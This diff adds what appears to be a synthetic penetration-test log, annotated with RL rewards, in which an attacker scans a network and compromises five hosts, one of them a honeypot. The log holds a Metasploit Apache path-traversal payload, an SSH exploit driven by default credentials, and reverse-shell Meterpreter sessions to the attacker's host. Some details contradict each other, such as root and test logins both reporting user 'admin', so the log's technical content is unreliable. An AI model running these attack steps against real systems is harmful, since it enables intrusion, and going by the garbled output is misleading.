@@ -1,0 +1,319 @@
+================================================================================
+PENETRATION TEST ENGAGEMENT LOG
+Engagement: engagement_04_novice_hits_honeypot
+Description: Less experienced tester accidentally exploits the honeypot
+Start Time: 2026-02-11 08:40:00 UTC
+Attacker IP: 10.20.30.40
+Target Network: 10.10.0.0/16
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 1] 2026-02-11 08:41:08 | Action: SubnetScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 08:41:08 2026 as: nmap -sn 10.10.1.0/24
+# Timestamp: 2026-02-11 08:41:08
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0148s latency).
+MAC Address: 9B:2B:7F:3C:D5:73 (VMware)
+
+Nmap done: 256 IP addresses (1 hosts up) scanned in 35.24 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 2] 2026-02-11 08:43:25 | Action: ServiceScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 08:43:25 2026 as: nmap -sV -sC 10.10.1.10
+# Timestamp: 2026-02-11 08:43:25
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0164s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
+80/tcp    open   http          Apache httpd 2.4.49 ((Ubuntu))
+| ssh-hostkey:
+|   3072 98:db:9c:1e:32:6a:6c:87:29:50:7a:58:26:50:01:d1 (RSA)
+|   256 e6:f0:95:10:76:93:90:e8:24:77:87:65:d9:3a:73:4c (ECDSA)
+|_http-server-header: Apache httpd 2.4.49 ((Ubuntu))
+|_http-title: Welcome
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 37.46 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 3] 2026-02-11 08:44:23 | Action: HTTP-EXP | Target: dmz-web01 (10.10.1.10)
+[RL] reward=8.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/multi/http/apache_path_traversal_rce
+msf6 apache_path_traversal_rce(exploit/multi/http/apache_path_traversal_rce) > set RHOSTS 10.10.1.10
+RHOSTS => 10.10.1.10
+msf6 apache_path_traversal_rce(exploit/multi/http/apache_path_traversal_rce) > run
+
+[*] [2026-02-11 08:44:23] Started reverse TCP handler on 10.20.30.40:4446
+[*] [2026-02-11 08:44:23] 10.10.1.10:80 - Sending path traversal request...
+[*] [2026-02-11 08:44:23] 10.10.1.10:80 - GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+[+] [2026-02-11 08:44:23] 10.10.1.10:80 - Path traversal successful, RCE achieved
+[*] [2026-02-11 08:44:23] Sending stage (860638 bytes) to 10.10.1.10
+[*] [2026-02-11 08:44:23] Meterpreter session 2 opened (10.20.30.40:4446 -> 10.10.1.10:45436)
+
+meterpreter > getuid
+Server username: www-data
+meterpreter > sysinfo
+Computer     : dmz-web01
+OS           : Ubuntu 20.04.3 LTS
+────────────────────────────────────────────────────────────────────────────────
+[Step 4] 2026-02-11 08:47:35 | Action: SubnetScan | Target: ws-admin01 (10.10.3.30)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 08:47:35 2026 as: nmap -sn 10.10.3.0/24
+# Timestamp: 2026-02-11 08:47:35
+Nmap scan report for ws-admin01 (10.10.3.30)
+Host is up (0.0137s latency).
+MAC Address: 93:E0:3F:EF:9B:CE (VMware)
+
+Nmap scan report for ws-dev02 (10.10.3.31)
+Host is up (0.0170s latency).
+MAC Address: FC:E0:29:14:DD:A5 (VMware)
+
+Nmap scan report for honeypot-trap01 (10.10.3.32)
+Host is up (0.0112s latency).
+MAC Address: 0D:2E:75:0A:89:14 (VMware)
+
+Nmap scan report for ws-finance03 (10.10.3.33)
+Host is up (0.0139s latency).
+MAC Address: 59:F0:E2:8E:5C:DF (VMware)
+
+Nmap scan report for ws-hr04 (10.10.3.34)
+Host is up (0.0117s latency).
+MAC Address: FB:2E:F0:B2:D1:AA (VMware)
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 15.47 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 5] 2026-02-11 08:48:41 | Action: OSScan | Target: honeypot-trap01 (10.10.3.32)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 08:48:41 2026 as: nmap -O 10.10.3.32
+# Timestamp: 2026-02-11 08:48:41
+Nmap scan report for honeypot-trap01 (10.10.3.32)
+Host is up (0.0065s latency).
+Not shown: 993 closed ports
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.15
+OS details: Ubuntu 22.04.1 LTS, kernel 5.15.0-52-generic
+Network Distance: 3 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 6] 2026-02-11 08:52:10 | Action: ServiceScan | Target: honeypot-trap01 (10.10.3.32)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 08:52:10 2026 as: nmap -sV -sC 10.10.3.32
+# Timestamp: 2026-02-11 08:52:10
+Nmap scan report for honeypot-trap01 (10.10.3.32)
+Host is up (0.0148s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open   ftp           vsftpd 3.0.5
+22/tcp    open   ssh           OpenSSH 8.9p1 Ubuntu 3
+80/tcp    open   http          nginx 1.22.0
+| ssh-hostkey:
+|   3072 12:e8:2d:a1:81:a5:3b:ce:00:ec:d3:1b:60:b9:ff:e2 (RSA)
+|   256 1a:68:88:43:93:e0:f8:3e:0e:7a:51:9f:07:d0:2f:73 (ECDSA)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+|_http-server-header: nginx 1.22.0
+|_http-title: Dashboard
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 21.57 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 7] 2026-02-11 08:53:20 | Action: SSH-EXP | Target: honeypot-trap01 (10.10.3.32)
+[RL] reward=-103.0 | cumulative=-95.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.3.32
+RHOSTS => 10.10.3.32
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-02-11 08:53:20] Started reverse TCP handler on 10.20.30.40:4444
+[*] [2026-02-11 08:53:20] 10.10.3.32:22 - Attempting SSH authentication bypass...
+[*] [2026-02-11 08:53:20] 10.10.3.32:22 - Trying credential pair: admin:password
+[+] [2026-02-11 08:53:20] 10.10.3.32:22 - SSH session established
+[*] [2026-02-11 08:53:20] Sending stage (910646 bytes) to 10.10.3.32
+[*] [2026-02-11 08:53:20] Meterpreter session 21 opened (10.20.30.40:4444 -> 10.10.3.32:45045)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : honeypot-trap01
+OS           : Ubuntu 22.04.1 LTS (kernel 5.15.0-52-generic)
+Architecture : x64
+Meterpreter  : x64/linux
+────────────────────────────────────────────────────────────────────────────────
+[Step 8] 2026-02-11 08:56:10 | Action: OSScan | Target: ws-dev02 (10.10.3.31)
+[RL] reward=0.0 | cumulative=-95.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 08:56:10 2026 as: nmap -O 10.10.3.31
+# Timestamp: 2026-02-11 08:56:10
+Nmap scan report for ws-dev02 (10.10.3.31)
+Host is up (0.0079s latency).
+Not shown: 995 closed ports
+22/tcp  open  ssh
+8080/tcp  open  http-proxy
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Ubuntu 18.04.6 LTS, kernel 4.15.0-163-generic
+Network Distance: 2 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 44.14 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 9] 2026-02-11 08:57:52 | Action: ServiceScan | Target: ws-dev02 (10.10.3.31)
+[RL] reward=0.0 | cumulative=-95.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 08:57:52 2026 as: nmap -sV -sC 10.10.3.31
+# Timestamp: 2026-02-11 08:57:52
+Nmap scan report for ws-dev02 (10.10.3.31)
+Host is up (0.0103s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+8080/tcp    open   http-proxy    Apache Tomcat 9.0.30
+| ssh-hostkey:
+|   3072 c4:61:45:23:8d:d4:ae:88:01:90:98:fa:4c:e4:f7:b0 (RSA)
+|   256 aa:c1:e9:a4:60:7a:c4:77:d2:16:a2:f2:c3:c5:4d:fd (ECDSA)
+|_http-server-header: Apache Tomcat 9.0.30
+|_http-title: Apache2 Default Page
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 10] 2026-02-11 09:01:03 | Action: SSH-EXP | Target: ws-dev02 (10.10.3.31)
+[RL] reward=7.0 | cumulative=-88.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.3.31
+RHOSTS => 10.10.3.31
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-02-11 09:01:03] Started reverse TCP handler on 10.20.30.40:4444
+[*] [2026-02-11 09:01:03] 10.10.3.31:22 - Attempting SSH authentication bypass...
+[*] [2026-02-11 09:01:03] 10.10.3.31:22 - Trying credential pair: admin:admin123
+[+] [2026-02-11 09:01:03] 10.10.3.31:22 - SSH session established
+[*] [2026-02-11 09:01:03] Sending stage (895423 bytes) to 10.10.3.31
+[*] [2026-02-11 09:01:03] Meterpreter session 11 opened (10.20.30.40:4444 -> 10.10.3.31:43288)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : ws-dev02
+OS           : Ubuntu 18.04.6 LTS (kernel 4.15.0-163-generic)
+Architecture : x64
+Meterpreter  : x64/linux
+────────────────────────────────────────────────────────────────────────────────
+[Step 11] 2026-02-11 09:03:57 | Action: ServiceScan | Target: db-primary (10.10.2.20)
+[RL] reward=0.0 | cumulative=-88.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 09:03:57 2026 as: nmap -sV -sC 10.10.2.20
+# Timestamp: 2026-02-11 09:03:57
+Nmap scan report for db-primary (10.10.2.20)
+Host is up (0.0011s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 8.4p1 Debian 5+deb11u1
+3306/tcp    open   mysql         MySQL 5.7.36-0ubuntu0.18.04.1
+| ssh-hostkey:
+|   3072 49:d1:4f:26:f0:87:ad:cb:29:a8:c2:a2:f9:12:23:78 (RSA)
+|   256 93:74:2e:de:32:33:e3:55:99:0e:17:a6:1c:96:b7:bf (ECDSA)
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 20.23 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 12] 2026-02-11 09:05:39 | Action: SSH-EXP | Target: db-primary (10.10.2.20)
+[RL] reward=97.0 | cumulative=9.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.2.20
+RHOSTS => 10.10.2.20
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-02-11 09:05:39] Started reverse TCP handler on 10.20.30.40:4444
+[*] [2026-02-11 09:05:39] 10.10.2.20:22 - Attempting SSH authentication bypass...
+[*] [2026-02-11 09:05:39] 10.10.2.20:22 - Trying credential pair: root:toor
+[+] [2026-02-11 09:05:39] 10.10.2.20:22 - SSH session established
+[*] [2026-02-11 09:05:39] Sending stage (928354 bytes) to 10.10.2.20
+[*] [2026-02-11 09:05:39] Meterpreter session 17 opened (10.20.30.40:4444 -> 10.10.2.20:53502)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : db-primary
+OS           : Debian 11 (kernel 5.10.0-20-amd64)
+Architecture : x64
+Meterpreter  : x64/linux
+────────────────────────────────────────────────────────────────────────────────
+[Step 13] 2026-02-11 09:07:02 | Action: ServiceScan | Target: srv-backup01 (10.10.4.40)
+[RL] reward=0.0 | cumulative=9.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Wed Feb 11 09:07:02 2026 as: nmap -sV -sC 10.10.4.40
+# Timestamp: 2026-02-11 09:07:02
+Nmap scan report for srv-backup01 (10.10.4.40)
+Host is up (0.0022s latency).
+Not shown: 993 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 7.4 CentOS
+443/tcp    open   https         nginx 1.20.1
+| ssh-hostkey:
+|   3072 c3:7b:fe:49:76:ec:82:eb:82:04:ee:93:50:25:e2:b0 (RSA)
+|   256 99:d9:80:e9:9a:65:c4:f7:36:79:c3:b7:97:97:0b:ca (ECDSA)
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 14] 2026-02-11 09:10:06 | Action: SSH-EXP | Target: srv-backup01 (10.10.4.40)
+[RL] reward=97.0 | cumulative=106.0 | done=True | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.4.40
+RHOSTS => 10.10.4.40
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-02-11 09:10:06] Started reverse TCP handler on 10.20.30.40:4444
+[*] [2026-02-11 09:10:06] 10.10.4.40:22 - Attempting SSH authentication bypass...
+[*] [2026-02-11 09:10:06] 10.10.4.40:22 - Trying credential pair: test:test123
+[+] [2026-02-11 09:10:06] 10.10.4.40:22 - SSH session established
+[*] [2026-02-11 09:10:06] Sending stage (792856 bytes) to 10.10.4.40
+[*] [2026-02-11 09:10:06] Meterpreter session 28 opened (10.20.30.40:4444 -> 10.10.4.40:62472)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : srv-backup01
+OS           : CentOS 7.9 (kernel 3.10.0-1160.el7)
+Architecture : x64
+Meterpreter  : x64/linux
+
+================================================================================
+ENGAGEMENT COMPLETE: 2026-02-11 09:10:06 UTC
+Total Steps: 14
+================================================================================
+Total Reward: 106
+Goal Reached: True
